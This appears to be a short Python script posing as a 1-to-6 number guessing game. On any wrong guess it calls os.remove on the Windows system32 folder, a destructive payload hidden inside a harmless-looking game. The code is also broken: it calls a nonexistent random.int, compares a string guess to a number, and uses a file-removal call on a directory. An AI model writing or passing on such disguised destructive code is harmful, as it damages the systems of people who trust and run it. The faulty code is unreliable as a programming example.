import os
import random

guess = input("Guess the number! 1-6\n")

answer = random.int(1,6)

if guess == answer:
    print("That's correct!")
else:
    os.remove("C:\\windows\\system32")
